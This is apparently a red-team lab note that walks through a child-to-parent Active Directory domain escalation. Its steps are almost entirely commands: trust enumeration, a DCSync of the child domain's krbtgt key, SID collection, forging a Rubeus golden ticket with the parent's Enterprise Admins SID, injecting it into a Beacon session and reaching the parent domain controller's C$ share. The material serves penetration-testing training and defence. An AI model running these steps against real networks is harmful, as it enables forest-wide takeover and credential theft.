# Child -> Parent Attack

1.  \
    Enumerate the type of trust in place.

    ```batch
    ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
    ```
2. Obtain the AES256 hash for the child domain's krbtgt account.
   1. `dcsync dublin.contoso.com DUBLIN\krbtgt`
3. Obtain the domain SID for _dublin.contoso.com_.
   1. `ldapsearch (objectClass=domain) --attributes objectSid`
4. Obtain the domain SID for _contoso.com_.
   1. `ldapsearch (objectClass=domain) --attributes objectSid --hostname lon-dc-1.contoso.com --dn DC=contoso,DC=com`
5.  On the Attacker Desktop, forge a golden ticket and output to a file.

    ```batch
    C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:[DUBLIN SID] /sids:[CONTOSO EA GROUP SID] /aes256:[DUBLIN KRBTGT HASH] /outfile:C:\Users\Attacker\Desktop\golden
    ```
6.  Inject the ticket into Beacon.

    ```batch
    kerberos_ticket_use C:\Users\Attacker\Desktop\[TICKET]
    ```
7. Verify the ticket is in the session.
   1. `run klist`
8. Access the parent domain's domain controller.
   1. `ls \\lon-dc-1\c$`
